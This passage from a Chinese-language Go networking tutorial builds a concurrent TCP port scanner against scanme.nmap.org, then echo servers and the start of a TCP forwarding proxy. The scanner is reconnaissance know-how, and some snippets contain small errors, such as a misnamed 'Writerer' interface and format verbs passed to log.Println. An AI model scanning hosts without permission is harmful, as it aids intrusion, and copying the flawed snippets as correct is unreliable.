工人池–&gt;多通道通信</h4><p>为了避免结果不一致，我们需要使用<code>gorountine</code>池管理正在进行的并发工作，使用<code>for</code>循环创建一定数量的工人<code>gorountine</code>作为资源池，然后再<code>main</code>线程中使用通道提供工作</p><p>首先，我们创建一个新程序，程序有100个worker，使用一个<code>int</code>通道将他们打印到屏幕上，继续使用<code>WaitGroup</code>阻塞执行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>,wg *sync.WaitGroup)</span></span>  &#123;</span><br><span class="line"><span class="keyword">for</span> p := <span class="keyword">range</span> ports&#123;</span><br><span class="line">fmt.Println(p)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span> ,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;=<span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(ports,&amp;wg)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">ports &lt;- i</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="built_in">close</span>(ports)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们再使用了make去创建了一个通道，在此处int 值等于 100，这样就可以对该通道进行缓冲，这也意味着 可以在不等待接收器读取数据的情况下，向其发送数据。缓冲通道可以维护多个生产者和消费者的问题，将通道容量设为100意味着发送被阻止之前，可以容纳100个数据项，这样做可以提升性能，因为允许所有的工人立即启动</p><blockquote><p>在上面的例子中，我们可以很清楚的看见，数字并不是按照顺序打印的，因为端口扫描器不回去检查他们的顺序，我们可以使用单独的线程扫描器将扫描结果传回主线程，以便在打印之前对端口进行一个排序，这样做的好处是，可以消除对<code>WaitGroup</code>的依赖</p></blockquote><p>接下来进行修改，使用多通道进行扫描</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports,results <span class="keyword">chan</span> <span class="type">int</span>)</span></span>  &#123;</span><br><span class="line"><span class="keyword">for</span> p := <span class="keyword">range</span> ports&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,p)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">results &lt;- <span class="number">0</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">results &lt;- p</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span> ,<span class="number">100</span>)</span><br><span class="line">results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">var</span> openports  [] <span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt;=<span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(ports,results)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">ports &lt;- i</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">port := &lt;-results</span><br><span class="line"><span class="keyword">if</span> port != <span class="number">0</span> &#123;</span><br><span class="line">openports = <span class="built_in">append</span>(openports,port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(ports)</span><br><span class="line"><span class="built_in">close</span>(results)</span><br><span class="line">sort.Ints(openports)</span><br><span class="line"><span class="keyword">for</span> _,port := <span class="keyword">range</span> openports&#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d opend\n&quot;</span>,port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个高效的扫描器需要花时间去处理工人的数量，数量越多，程序执行的越快，但是当工人数量过多的时候，结果就会变得不可靠</p><h3 id="0x04-构造TCP代理"><a href="#0x04-构造TCP代理" class="headerlink" title="0x04 构造TCP代理"></a>0x04 构造TCP代理</h3><h4 id="1-使用io-Reader和io-writer"><a href="#1-使用io-Reader和io-writer" class="headerlink" title="1. 使用io.Reader和io.writer"></a>1. 使用io.Reader和io.writer</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</span><br><span class="line">Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Writerer <span class="keyword">interface</span> &#123;</span><br><span class="line">Writer(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在GO语言中，以上两种数据类型被定义为接口，这意味着他们不能直接被实例化,该抽象方法必须在某种数据类型上得到实现才能运用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolreader * FooReader)</span></span> Read(p [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//从某处读取一些数据</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;ssssss&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(s),<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(p [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//从某处写入一些数据</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;ssssss&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(s),<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面看个例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//从标准输入 stdin 读取数据 io.Reader</span></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">//定义一个 写入标准输出 stdout的 io.Writer</span></span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolReader * FooReader)</span></span> Read(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;in &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;out &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//实例化 Reader和writer</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">reader FooReader</span><br><span class="line">writer FooWriter</span><br><span class="line">)</span><br><span class="line"><span class="comment">//创建缓冲区已保存输入/输出</span></span><br><span class="line">input := <span class="built_in">make</span>([] <span class="type">byte</span>,<span class="number">4096</span>)</span><br><span class="line"><span class="comment">//使用 reader读取</span></span><br><span class="line">s,err := reader.Read(input)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to read data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Read %d bytes from stdin\n&quot;</span>,s)</span><br><span class="line"><span class="comment">//使用writer写出</span></span><br><span class="line">s,err = writer.Write(input)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;wrote %d bytes to stdout\n&quot;</span>,s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将Reader 复制到Writer是一种非常常见的模式，于是官方提供了一个<code>io.Copy()</code>用于简化操作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//从标准输入 stdin 读取数据 io.Reader</span></span><br><span class="line"><span class="keyword">type</span>  FooReader <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">//定义一个 写入标准输出 stdout的 io.Writer</span></span><br><span class="line"><span class="keyword">type</span>  FooWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolReader * FooReader)</span></span> Read(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;in &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foolWriter * FooWriter)</span></span> Write(b [] <span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;out &gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//实例化 Reader和writer</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">reader FooReader</span><br><span class="line">writer FooWriter</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> _, err := io.Copy(&amp;writer, &amp;reader); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;发生了错误&quot;</span> )</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了io.Copy 只需要 处理先读后写的过程，而无需关注其他细节。</p><h4 id="2-创建回显服务器"><a href="#2-创建回显服务器" class="headerlink" title="2. 创建回显服务器"></a>2. 创建回显服务器</h4><p>按照大多数语言的习惯，首先需要一个回显服务器，以学习如何再套接字中读写数据，为此，需要用到<code>net.Conn</code></p><p>创建Conn实例以后，可以通过TCP套接字接受和发送数据，不过TCP服务器不能简单的创造一个连接，连接必须由客户端发起建立。</p><p>在Go中可以使用<code>net.Listen(network,address string)</code>在特定端口打开TCP监听器，客户端连接后，可以使用<code>Accept()</code>创建一个Conn对象，可以用于接受和发送数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span class="comment">//创建一个缓冲区来接受储存的数据</span></span><br><span class="line">b := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">512</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;<span class="comment">//进行无线循环</span></span><br><span class="line"><span class="comment">//通过conn.Read接受数据到缓冲区</span></span><br><span class="line">size,err := conn.Read(b[<span class="number">0</span>:])</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Client disconnected&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Unexpected error&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Received %d bytes : %s\n&quot;</span>,size,<span class="type">string</span>(b))</span><br><span class="line"><span class="comment">//通过write 发送数据</span></span><br><span class="line">log.Println(<span class="string">&quot;Writing Data&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> _,err :=conn.Write(b[<span class="number">0</span>:size]);err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="comment">//在所有接口上绑定 TCP端口 20080</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to tcp&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Listening on 0.0.0.0:20080&quot;</span>)</span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line"><span class="comment">//等待连接，在已经建立连接上创捷 net.Conn</span></span><br><span class="line">conn,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理连接，使用gorountine并发</span></span><br><span class="line"><span class="keyword">go</span> echo(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中Conn既是<code>Reader</code>也是<code>Writer</code>，实现了<code>Read[]byte</code>，和Write([] byte)方法</p><p>之后，使用<code>gorountine</code>使其成为并发调用，以便在等待处理函数完成时，其他连接不会被阻塞</p><p>当我们使用<code>telnet</code>进行一个连接的时候</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220220114739.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220220114831.png"></p><p>可以看见回显服务器将客户端发送给它的内容完全重复的发送给客户端</p><h4 id="3-创建缓冲带的监听器来改进代码"><a href="#3-创建缓冲带的监听器来改进代码" class="headerlink" title="3. 创建缓冲带的监听器来改进代码"></a>3. 创建缓冲带的监听器来改进代码</h4><p>上面的例子依赖相当低级的函数调用，且缓冲区跟踪重复读写，其运行过程容易出错。可以使用<code>bufio</code>包，其中也包含了<code>Reader</code>和<code>Writer</code>，我们稍微改进一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo2</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span class="comment">//创建一个缓冲区来接受储存的数据</span></span><br><span class="line">reader :=bufio.NewReader(conn)</span><br><span class="line">s,err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to read data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;Read %d bytes :%s&quot;</span>,<span class="built_in">len</span>(s),s)</span><br><span class="line">log.Println(<span class="string">&quot;Writing data&quot;</span>)</span><br><span class="line">writer := bufio.NewWriter(conn)</span><br><span class="line"><span class="keyword">if</span> _, err := writer.WriteString(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">writer.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="comment">//在所有接口上绑定 TCP端口 20080</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to tcp&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Listening on 0.0.0.0:20080&quot;</span>)</span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line"><span class="comment">//等待连接，在已经建立连接上创捷 net.Conn</span></span><br><span class="line">conn,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理连接，使用gorountine并发</span></span><br><span class="line"><span class="keyword">go</span> echo2(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们不在<code>Conn</code>上调用函数<code>Read([]byte)</code> 和<code>Write([]byte)</code>，而是通过NewReader(io.Reader)和 NewWriter(io.Writer)初始化新的缓冲带。这些调用都以现有的<code>Reader</code>和<code>Writer</code>为基础</p><p>两个缓冲实例都具有用于读取和写入的字符串数据的功能。<code>ReadString(byte)</code>带有一个分隔符，表示数据读取长度。而WritrString(byte)则将字符串写入套接字，写入数据时，需要显示调用<code>writer.Flush()</code>，以便将所有的数据写入底层的<code>Writer</code></p><p>在此示例中，变量conn作为源和目标传递，因为将在建立的连接上回显内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func echo3(conn net.Conn)  &#123;</span><br><span class="line">defer conn.Close()</span><br><span class="line">//使用io.Copy进行复制</span><br><span class="line">if _,err := io.Copy(conn,conn); err != nil &#123;</span><br><span class="line">log.Fatalln(&quot;unable to read/write data&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-创建一个TCP客户端"><a href="#4-创建一个TCP客户端" class="headerlink" title="4. 创建一个TCP客户端"></a>4. 创建一个TCP客户端</h4><p>在很多情况下，我们需要把一个网站上收到的流量全部转发到另一台服务器，我们可以编写如下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(src net.Conn)</span></span>&#123;</span><br><span class="line">dst,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;某A网站&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to connect to our unreachable host&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> dst.Close()</span><br><span class="line"><span class="comment">//在gorountine 中运行防止 io.Copy被阻塞</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//将资源的输出复制到目标</span></span><br><span class="line"><span 